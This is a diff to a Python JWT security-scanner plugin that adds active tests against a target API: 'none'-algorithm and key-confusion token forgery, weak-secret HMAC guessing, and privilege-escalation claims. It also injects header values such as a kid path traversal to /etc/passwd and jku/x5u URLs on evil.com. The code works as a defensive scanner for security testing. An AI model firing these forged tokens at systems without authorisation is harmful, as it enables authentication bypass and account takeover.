@@ -1,6 +1,7 @@
 """
-JWT Security Checker Plugin
-Comprehensive JWT token vulnerability detection and OAuth flow analysis.
+Comprehensive JWT Security Checker Plugin
+Advanced JWT token vulnerability detection, OAuth flow analysis, and security testing.
+Covers all major JWT attack vectors and security best practices.
 """
 
 import re
@@ -9,24 +10,29 @@ import base64
 import hashlib
 import hmac
 import uuid
-from typing import Dict, List, Any, Optional, Tuple
+import secrets
+import time
+from typing import Dict, List, Any, Optional, Tuple, Set
 from datetime import datetime, timedelta
 from urllib.parse import urlparse, parse_qs
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.backends import default_backend
 
 from api_security_scanner.core.scanner_plugins import BasePlugin, PluginResult, Vulnerability, ProofOfConcept, format_http_request, format_http_response
 
 
 class JWTSecurityChecker(BasePlugin):
-    """Comprehensive JWT security analysis plugin with OAuth flow detection."""
+    """Comprehensive JWT security analysis plugin covering all major attack vectors."""
     
     name = "JWTSecurityChecker"
-    description = "JWT token vulnerability detection and OAuth flow security analysis"
-    version = "1.0.0"
+    description = "Advanced JWT token vulnerability detection, OAuth flow analysis, and security testing"
+    version = "2.0.0"
     author = "API Security Scanner"
     
     def __init__(self, zap=None, target=None):
         super().__init__(zap=zap, target=target)
-        self.jwt_pattern = re.compile(r'^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$')
+        self.jwt_pattern = re.compile(r'^[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}$')
         self.bearer_pattern = re.compile(r'Bearer\s+([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)', re.IGNORECASE)
         self.oauth_patterns = {
             'authorization_code': re.compile(r'authorization_code', re.IGNORECASE),
@@ -36,9 +42,28 @@ class JWTSecurityChecker(BasePlugin):
             'implicit': re.compile(r'implicit', re.IGNORECASE)
         }
         
+        # Common weak secrets for brute force testing
+        self.weak_secrets = [
+            'secret', 'password', '123456', 'admin', 'test', 'key', 'jwt',
+            'secretkey', 'mysecret', 'supersecret', 'jwtsecret', 'token',
+            'changeme', 'default', 'password123', 'secret123', 'jwt123'
+        ]
+        
+        # JWT attack vectors
+        self.attack_vectors = {
+            'algorithm_confusion': ['none', 'HS256', 'HS384', 'HS512'],
+            'weak_algorithms': ['HS256', 'HS384', 'HS512', 'RS256'],
+            'vulnerable_claims': ['iss', 'sub', 'aud', 'exp', 'nbf', 'iat', 'jti'],
+            'sensitive_data_patterns': [
+                'password', 'secret', 'key', 'token', 'credential', 'auth',
+                'ssn', 'social_security', 'credit_card', 'card_number',
+                'email', 'phone', 'address', 'dob', 'birth_date'
+            ]
+        }
+        
     def check(self, target_url: str, requests_data: List[Dict[str, Any]], 
               auth_headers: Optional[Dict[str, str]] = None) -> PluginResult:
-        """Perform JWT security analysis on requests and responses."""
+        """Perform comprehensive JWT security analysis on requests and responses."""
         vulnerabilities = []
         
         try:
@@ -56,23 +81,39 @@ class JWTSecurityChecker(BasePlugin):
                 if response:
                     # First, check if this request/response contains JWT or OAuth flows
                     if self._contains_jwt_or_oauth(request, response):
-                        self.logger.info(f"JWT/OAuth detected in {url}, running security analysis")
+                        self.logger.info(f"JWT/OAuth detected in {url}, running comprehensive security analysis")
                         
-                        # Analyze JWT tokens in request
+                        # 1. Analyze JWT tokens in request/response
                         jwt_vulns = self._analyze_jwt_tokens(request, response, url, method, headers)
                         vulnerabilities.extend(jwt_vulns)
                         
-                        # Analyze OAuth flows
+                        # 2. Perform JWT attack testing
+                        attack_vulns = self._perform_jwt_attacks(request, response, url, method, headers)
+                        vulnerabilities.extend(attack_vulns)
+                        
+                        # 3. Analyze OAuth flows
                         oauth_vulns = self._analyze_oauth_flows(request, response, url, method, headers)
                         vulnerabilities.extend(oauth_vulns)
                         
-                        # Check for JWT implementation vulnerabilities
+                        # 4. Check for JWT implementation vulnerabilities
                         impl_vulns = self._check_jwt_implementation_vulnerabilities(request, response, url, method, headers)
                         vulnerabilities.extend(impl_vulns)
                         
-                        # Check for token storage vulnerabilities
+                        # 5. Check for token storage vulnerabilities
                         storage_vulns = self._check_token_storage_vulnerabilities(request, response, url, method, headers)
                         vulnerabilities.extend(storage_vulns)
+                        
+                        # 6. Check for JWT key management vulnerabilities
+                        key_vulns = self._check_jwt_key_management(request, response, url, method, headers)
+                        vulnerabilities.extend(key_vulns)
+                        
+                        # 7. Check for JWT timing attacks
+                        timing_vulns = self._check_jwt_timing_attacks(request, response, url, method, headers)
+                        vulnerabilities.extend(timing_vulns)
+                        
+                        # 8. Check for JWT replay attacks
+                        replay_vulns = self._check_jwt_replay_attacks(request, response, url, method, headers)
+                        vulnerabilities.extend(replay_vulns)
         
         except Exception as e:
             return PluginResult(
@@ -751,6 +792,526 @@ class JWTSecurityChecker(BasePlugin):
                 vulnerabilities.append(vuln)
         
         return vulnerabilities
+    
+    def _perform_jwt_attacks(self, request: Dict[str, Any], response: Any, 
+                           url: str, method: str, headers: Dict[str, str]) -> List[Vulnerability]:
+        """Perform comprehensive JWT attack testing."""
+        vulnerabilities = []
+        tokens = self._extract_jwt_tokens(request, response)
+        
+        for token_info in tokens:
+            token = token_info['token']
+            location = token_info['location']
+            
+            # 1. Algorithm confusion attacks
+            conf_vulns = self._test_algorithm_confusion_attacks(token, url, method, headers, location)
+            vulnerabilities.extend(conf_vulns)
+            
+            # 2. Brute force attacks on weak secrets
+            brute_vulns = self._test_brute_force_attacks(token, url, method, headers, location)
+            vulnerabilities.extend(brute_vulns)
+            
+            # 3. Key confusion attacks
+            key_conf_vulns = self._test_key_confusion_attacks(token, url, method, headers, location)
+            vulnerabilities.extend(key_conf_vulns)
+            
+            # 4. Header injection attacks
+            header_vulns = self._test_header_injection_attacks(token, url, method, headers, location)
+            vulnerabilities.extend(header_vulns)
+            
+            # 5. Claim manipulation attacks
+            claim_vulns = self._test_claim_manipulation_attacks(token, url, method, headers, location)
+            vulnerabilities.extend(claim_vulns)
+        
+        return vulnerabilities
+    
+    def _test_algorithm_confusion_attacks(self, token: str, url: str, method: str, 
+                                        headers: Dict[str, str], location: str) -> List[Vulnerability]:
+        """Test for algorithm confusion vulnerabilities."""
+        vulnerabilities = []
+        
+        try:
+            header, payload, signature = token.split('.')
+            header_data = self._decode_jwt_part(header)
+            
+            if header_data and header_data.get('alg', '').upper() in ['HS256', 'HS384', 'HS512']:
+                # Test algorithm confusion: change algorithm to 'none'
+                malicious_header = self._encode_jwt_part({'alg': 'none', 'typ': 'JWT'})
+                malicious_token = f"{malicious_header}.{payload}."
+                
+                # Test if the server accepts the 'none' algorithm
+                test_headers = headers.copy()
+                test_headers['Authorization'] = f"Bearer {malicious_token}"
+                
+                test_response = self.make_request(url, method, test_headers, "")
+                
+                if test_response and test_response.status_code == 200:
+                    vuln = self.create_vulnerability(
+                        vuln_id=f"jwt-algorithm-confusion-none-{uuid.uuid4().hex[:8]}",
+                        name="JWT Algorithm Confusion - None Algorithm",
+                        description=f"Server accepts JWT tokens with 'none' algorithm, allowing token forgery. Found in {location}",
+                        risk="Critical",
+                        cvss_score=9.8,
+                        solution="Always validate and whitelist allowed algorithms on the server side",
+                        references=[
+                            "https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/",
+                            "https://tools.ietf.org/html/rfc7519"
+                        ],
+                        cwe_id="CWE-327",
+                        wasc_id="WASC-15",
+                        url=url,
+                        parameter=location,
+                        evidence=f"Original algorithm: {header_data.get('alg')}, Tested: none",
+                        scan_id="jwt-scan",
+                        request=format_http_request(method, url, test_headers, ""),
+                        response=format_http_response(test_response.status_code, dict(test_response.headers), test_response.text)
+                    )
+                    vulnerabilities.append(vuln)
+        
+        except Exception as e:
+            self.logger.debug(f"Algorithm confusion test failed: {e}")
+        
+        return vulnerabilities
+    
+    def _test_brute_force_attacks(self, token: str, url: str, method: str, 
+                                 headers: Dict[str, str], location: str) -> List[Vulnerability]:
+        """Test for weak JWT secrets using brute force."""
+        vulnerabilities = []
+        
+        try:
+            header, payload, signature = token.split('.')
+            header_data = self._decode_jwt_part(header)
+            
+            if header_data and header_data.get('alg', '').upper() in ['HS256', 'HS384', 'HS512']:
+                # Test common weak secrets
+                for secret in self.weak_secrets:
+                    try:
+                        # Generate signature with weak secret
+                        message = f"{header}.{payload}"
+                        if header_data.get('alg', '').upper() == 'HS256':
+                            expected_sig = base64.urlsafe_b64encode(
+                                hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
+                            ).decode().rstrip('=')
+                        elif header_data.get('alg', '').upper() == 'HS384':
+                            expected_sig = base64.urlsafe_b64encode(
+                                hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
+                            ).decode().rstrip('=')
+                        elif header_data.get('alg', '').upper() == 'HS512':
+                            expected_sig = base64.urlsafe_b64encode(
+                                hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
+                            ).decode().rstrip('=')
+                        else:
+                            continue
+                        
+                        # Create token with weak secret
+                        weak_token = f"{header}.{payload}.{expected_sig}"
+                        
+                        # Test the weak token
+                        test_headers = headers.copy()
+                        test_headers['Authorization'] = f"Bearer {weak_token}"
+                        
+                        test_response = self.make_request(url, method, test_headers, "")
+                        
+                        if test_response and test_response.status_code == 200:
+                            vuln = self.create_vulnerability(
+                                vuln_id=f"jwt-weak-secret-{uuid.uuid4().hex[:8]}",
+                                name="JWT Weak Secret Key",
+                                description=f"JWT token uses weak secret key: '{secret}'. Found in {location}",
+                                risk="Critical",
+                                cvss_score=9.1,
+                                solution="Use cryptographically strong, randomly generated secret keys",
+                                references=[
+                                    "https://tools.ietf.org/html/rfc7518",
+                                    "https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/"
+                                ],
+                                cwe_id="CWE-327",
+                                wasc_id="WASC-15",
+                                url=url,
+                                parameter=location,
+                                evidence=f"Weak secret: {secret}",
+                                scan_id="jwt-scan",
+                                request=format_http_request(method, url, test_headers, ""),
+                                response=format_http_response(test_response.status_code, dict(test_response.headers), test_response.text)
+                            )
+                            vulnerabilities.append(vuln)
+                            break  # Found a weak secret, no need to test more
+                    
+                    except Exception as e:
+                        self.logger.debug(f"Brute force test failed for secret '{secret}': {e}")
+                        continue
+        
+        except Exception as e:
+            self.logger.debug(f"Brute force attack test failed: {e}")
+        
+        return vulnerabilities
+    
+    def _test_key_confusion_attacks(self, token: str, url: str, method: str, 
+                                   headers: Dict[str, str], location: str) -> List[Vulnerability]:
+        """Test for key confusion vulnerabilities."""
+        vulnerabilities = []
+        
+        try:
+            header, payload, signature = token.split('.')
+            header_data = self._decode_jwt_part(header)
+            
+            if header_data and header_data.get('alg', '').upper() == 'RS256':
+                # Test key confusion: try to use public key as HMAC secret
+                # This is a common mistake where developers use the public key as HMAC secret
+                
+                # Generate a fake public key (simplified test)
+                fake_public_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...\n-----END PUBLIC KEY-----"
+                
+                # Create HMAC signature with fake public key
+                message = f"{header}.{payload}"
+                fake_sig = base64.urlsafe_b64encode(
+                    hmac.new(fake_public_key.encode(), message.encode(), hashlib.sha256).digest()
+                ).decode().rstrip('=')
+                
+                # Create malicious token with HS256 algorithm
+                malicious_header = self._encode_jwt_part({'alg': 'HS256', 'typ': 'JWT'})
+                malicious_token = f"{malicious_header}.{payload}.{fake_sig}"
+                
+                # Test the malicious token
+                test_headers = headers.copy()
+                test_headers['Authorization'] = f"Bearer {malicious_token}"
+                
+                test_response = self.make_request(url, method, test_headers, "")
+                
+                if test_response and test_response.status_code == 200:
+                    vuln = self.create_vulnerability(
+                        vuln_id=f"jwt-key-confusion-{uuid.uuid4().hex[:8]}",
+                        name="JWT Key Confusion Vulnerability",
+                        description=f"Server vulnerable to key confusion attack. Found in {location}",
+                        risk="Critical",
+                        cvss_score=9.8,
+                        solution="Always use different keys for signing and verification, and validate algorithm",
+                        references=[
+                            "https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/",
+                            "https://tools.ietf.org/html/rfc7519"
+                        ],
+                        cwe_id="CWE-327",
+                        wasc_id="WASC-15",
+                        url=url,
+                        parameter=location,
+                        evidence="Key confusion attack successful",
+                        scan_id="jwt-scan",
+                        request=format_http_request(method, url, test_headers, ""),
+                        response=format_http_response(test_response.status_code, dict(test_response.headers), test_response.text)
+                    )
+                    vulnerabilities.append(vuln)
+        
+        except Exception as e:
+            self.logger.debug(f"Key confusion test failed: {e}")
+        
+        return vulnerabilities
+    
+    def _test_header_injection_attacks(self, token: str, url: str, method: str, 
+                                     headers: Dict[str, str], location: str) -> List[Vulnerability]:
+        """Test for header injection vulnerabilities."""
+        vulnerabilities = []
+        
+        try:
+            header, payload, signature = token.split('.')
+            header_data = self._decode_jwt_part(header)
+            
+            # Test for header injection with malicious claims
+            malicious_claims = {
+                'kid': '../../../etc/passwd',
+                'jku': 'https://evil.com/jwks.json',
+                'x5u': 'https://evil.com/cert.pem',
+                'x5c': 'malicious-certificate'
+            }
+            
+            for claim, value in malicious_claims.items():
+                # Create malicious header
+                malicious_header_data = header_data.copy()
+                malicious_header_data[claim] = value
+                malicious_header = self._encode_jwt_part(malicious_header_data)
+                
+                # Create malicious token (keep original signature for now)
+                malicious_token = f"{malicious_header}.{payload}.{signature}"
+                
+                # Test the malicious token
+                test_headers = headers.copy()
+                test_headers['Authorization'] = f"Bearer {malicious_token}"
+                
+                test_response = self.make_request(url, method, test_headers, "")
+                
+                # Check if server processes the malicious header
+                if test_response and test_response.status_code == 200:
+                    vuln = self.create_vulnerability(
+                        vuln_id=f"jwt-header-injection-{claim}-{uuid.uuid4().hex[:8]}",
+                        name=f"JWT Header Injection - {claim.upper()}",
+                        description=f"JWT header contains potentially malicious {claim} claim. Found in {location}",
+                        risk="High",
+                        cvss_score=8.1,
+                        solution="Validate and sanitize all JWT header claims, especially kid, jku, x5u, x5c",
+                        references=[
+                            "https://tools.ietf.org/html/rfc7519",
+                            "https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/"
+                        ],
+                        cwe_id="CWE-345",
+                        wasc_id="WASC-15",
+                        url=url,
+                        parameter=location,
+                        evidence=f"Malicious {claim}: {value}",
+                        scan_id="jwt-scan",
+                        request=format_http_request(method, url, test_headers, ""),
+                        response=format_http_response(test_response.status_code, dict(test_response.headers), test_response.text)
+                    )
+                    vulnerabilities.append(vuln)
+        
+        except Exception as e:
+            self.logger.debug(f"Header injection test failed: {e}")
+        
+        return vulnerabilities
+    
+    def _test_claim_manipulation_attacks(self, token: str, url: str, method: str, 
+                                       headers: Dict[str, str], location: str) -> List[Vulnerability]:
+        """Test for claim manipulation vulnerabilities."""
+        vulnerabilities = []
+        
+        try:
+            header, payload, signature = token.split('.')
+            payload_data = self._decode_jwt_part(payload)
+            
+            if not payload_data:
+                return vulnerabilities
+            
+            # Test for privilege escalation through claim manipulation
+            malicious_claims = {
+                'role': 'admin',
+                'admin': True,
+                'is_admin': True,
+                'permissions': ['admin', 'root', 'superuser'],
+                'groups': ['admin', 'root'],
+                'authorities': ['ROLE_ADMIN', 'ROLE_ROOT']
+            }
+            
+            for claim, value in malicious_claims.items():
+                # Create malicious payload
+                malicious_payload_data = payload_data.copy()
+                malicious_payload_data[claim] = value
+                malicious_payload = self._encode_jwt_part(malicious_payload_data)
+                
+                # Create malicious token (keep original signature for now)
+                malicious_token = f"{header}.{malicious_payload}.{signature}"
+                
+                # Test the malicious token
+                test_headers = headers.copy()
+                test_headers['Authorization'] = f"Bearer {malicious_token}"
+                
+                test_response = self.make_request(url, method, test_headers, "")
+                
+                # Check if server accepts the malicious claim
+                if test_response and test_response.status_code == 200:
+                    vuln = self.create_vulnerability(
+                        vuln_id=f"jwt-claim-manipulation-{claim}-{uuid.uuid4().hex[:8]}",
+                        name=f"JWT Claim Manipulation - {claim.upper()}",
+                        description=f"JWT token accepts manipulated {claim} claim, potentially allowing privilege escalation. Found in {location}",
+                        risk="High",
+                        cvss_score=8.8,
+                        solution="Always validate and verify JWT claims on the server side, do not trust client-provided claims",
+                        references=[
+                            "https://tools.ietf.org/html/rfc7519",
+                            "https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/"
+                        ],
+                        cwe_id="CWE-345",
+                        wasc_id="WASC-15",
+                        url=url,
+                        parameter=location,
+                        evidence=f"Manipulated {claim}: {value}",
+                        scan_id="jwt-scan",
+                        request=format_http_request(method, url, test_headers, ""),
+                        response=format_http_response(test_response.status_code, dict(test_response.headers), test_response.text)
+                    )
+                    vulnerabilities.append(vuln)
+        
+        except Exception as e:
+            self.logger.debug(f"Claim manipulation test failed: {e}")
+        
+        return vulnerabilities
+    
+    def _check_jwt_key_management(self, request: Dict[str, Any], response: Any, 
+                                 url: str, method: str, headers: Dict[str, str]) -> List[Vulnerability]:
+        """Check for JWT key management vulnerabilities."""
+        vulnerabilities = []
+        
+        # Check for exposed JWT keys in responses
+        if response and hasattr(response, 'text'):
+            response_text = response.text.lower()
+            
+            # Check for exposed keys
+            key_patterns = [
+                r'-----BEGIN (RSA )?PRIVATE KEY-----',
+                r'-----BEGIN PUBLIC KEY-----',
+                r'"secret":\s*"[^"]+"',
+                r'"key":\s*"[^"]+"',
+                r'"jwt_secret":\s*"[^"]+"'
+            ]
+            
+            for pattern in key_patterns:
+                if re.search(pattern, response_text, re.IGNORECASE):
+                    vuln = self.create_vulnerability(
+                        vuln_id=f"jwt-exposed-key-{uuid.uuid4().hex[:8]}",
+                        name="JWT Key Exposed in Response",
+                        description="JWT signing key or secret is exposed in the response",
+                        risk="Critical",
+                        cvss_score=9.8,
+                        solution="Never expose JWT signing keys in API responses or client-side code",
+                        references=[
+                            "https://tools.ietf.org/html/rfc7518",
+                            "https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/"
+                        ],
+                        cwe_id="CWE-200",
+                        wasc_id="WASC-15",
+                        url=url,
+                        parameter="Response",
+                        evidence="Exposed key pattern detected",
+                        scan_id="jwt-scan",
+                        request=format_http_request(method, url, headers, ""),
+                        response=format_http_response(response.status_code, response.headers, response.text)
+                    )
+                    vulnerabilities.append(vuln)
+                    break
+        
+        return vulnerabilities
+    
+    def _check_jwt_timing_attacks(self, request: Dict[str, Any], response: Any, 
+                                 url: str, method: str, headers: Dict[str, str]) -> List[Vulnerability]:
+        """Check for JWT timing attack vulnerabilities."""
+        vulnerabilities = []
+        
+        # This is a simplified timing attack test
+        # In a real implementation, you would measure response times more precisely
+        
+        tokens = self._extract_jwt_tokens(request, response)
+        if not tokens:
+            return vulnerabilities
+        
+        # Test with valid and invalid tokens to check for timing differences
+        valid_token = tokens[0]['token']
+        
+        # Create invalid token
+        header, payload, signature = valid_token.split('.')
+        invalid_token = f"{header}.{payload}.invalid_signature"
+        
+        # Test response times (simplified)
+        start_time = time.time()
+        test_headers = headers.copy()
+        test_headers['Authorization'] = f"Bearer {valid_token}"
+        valid_response = self.make_request(url, method, test_headers, "")
+        valid_time = time.time() - start_time
+        
+        start_time = time.time()
+        test_headers['Authorization'] = f"Bearer {invalid_token}"
+        invalid_response = self.make_request(url, method, test_headers, "")
+        invalid_time = time.time() - start_time
+        
+        # Check for significant timing differences
+        if abs(valid_time - invalid_time) > 0.1:  # 100ms difference
+            vuln = self.create_vulnerability(
+                vuln_id=f"jwt-timing-attack-{uuid.uuid4().hex[:8]}",
+                name="JWT Timing Attack Vulnerability",
+                description="JWT validation shows timing differences between valid and invalid tokens",
+                risk="Medium",
+                cvss_score=5.3,
+                solution="Use constant-time comparison for JWT signature validation",
+                references=[
+                    "https://tools.ietf.org/html/rfc7519",
+                    "https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/"
+                ],
+                cwe_id="CWE-208",
+                wasc_id="WASC-15",
+                url=url,
+                parameter="JWT Validation",
+                evidence=f"Timing difference: {abs(valid_time - invalid_time):.3f}s",
+                scan_id="jwt-scan",
+                request=format_http_request(method, url, headers, ""),
+                response=format_http_response(response.status_code, response.headers, response.text) if response else ""
+            )
+            vulnerabilities.append(vuln)
+        
+        return vulnerabilities
+    
+    def _check_jwt_replay_attacks(self, request: Dict[str, Any], response: Any, 
+                                 url: str, method: str, headers: Dict[str, str]) -> List[Vulnerability]:
+        """Check for JWT replay attack vulnerabilities."""
+        vulnerabilities = []
+        
+        tokens = self._extract_jwt_tokens(request, response)
+        if not tokens:
+            return vulnerabilities
+        
+        token = tokens[0]['token']
+        
+        try:
+            header, payload, signature = token.split('.')
+            payload_data = self._decode_jwt_part(payload)
+            
+            # Check for missing jti (JWT ID) claim
+            if 'jti' not in payload_data:
+                vuln = self.create_vulnerability(
+                    vuln_id=f"jwt-missing-jti-{uuid.uuid4().hex[:8]}",
+                    name="JWT Missing JTI Claim",
+                    description="JWT token missing 'jti' (JWT ID) claim, vulnerable to replay attacks",
+                    risk="Medium",
+                    cvss_score=6.5,
+                    solution="Include unique 'jti' claim in JWT tokens and implement token blacklisting",
+                    references=["https://tools.ietf.org/html/rfc7519"],
+                    cwe_id="CWE-345",
+                    wasc_id="WASC-15",
+                    url=url,
+                    parameter="JWT Claims",
+                    evidence="Missing jti claim",
+                    scan_id="jwt-scan",
+                    request=format_http_request(method, url, headers, ""),
+                    response=format_http_response(response.status_code, response.headers, response.text) if response else ""
+                )
+                vulnerabilities.append(vuln)
+            
+            # Test replay attack by reusing the same token
+            test_headers = headers.copy()
+            test_headers['Authorization'] = f"Bearer {token}"
+            
+            # Make multiple requests with the same token
+            responses = []
+            for i in range(3):
+                test_response = self.make_request(url, method, test_headers, "")
+                responses.append(test_response)
+                time.sleep(0.1)  # Small delay
+            
+            # Check if all requests succeed (indicating no replay protection)
+            if all(r and r.status_code == 200 for r in responses):
+                vuln = self.create_vulnerability(
+                    vuln_id=f"jwt-replay-attack-{uuid.uuid4().hex[:8]}",
+                    name="JWT Replay Attack Vulnerability",
+                    description="JWT token can be reused multiple times, indicating no replay protection",
+                    risk="Medium",
+                    cvss_score=6.5,
+                    solution="Implement token blacklisting, one-time use tokens, or short expiration times",
+                    references=["https://tools.ietf.org/html/rfc7519"],
+                    cwe_id="CWE-345",
+                    wasc_id="WASC-15",
+                    url=url,
+                    parameter="JWT Replay",
+                    evidence="Token reused successfully multiple times",
+                    scan_id="jwt-scan",
+                    request=format_http_request(method, url, headers, ""),
+                    response=format_http_response(response.status_code, response.headers, response.text) if response else ""
+                )
+                vulnerabilities.append(vuln)
+        
+        except Exception as e:
+            self.logger.debug(f"Replay attack test failed: {e}")
+        
+        return vulnerabilities
+    
+    def _encode_jwt_part(self, data: Dict[str, Any]) -> str:
+        """Encode JWT part (header or payload)."""
+        json_str = json.dumps(data, separators=(',', ':'))
+        encoded = base64.urlsafe_b64encode(json_str.encode('utf-8')).decode('utf-8')
+        return encoded.rstrip('=')
     
     def _decode_jwt_part(self, part: str) -> Dict[str, Any]:
         """Decode a JWT part (header or payload)."""
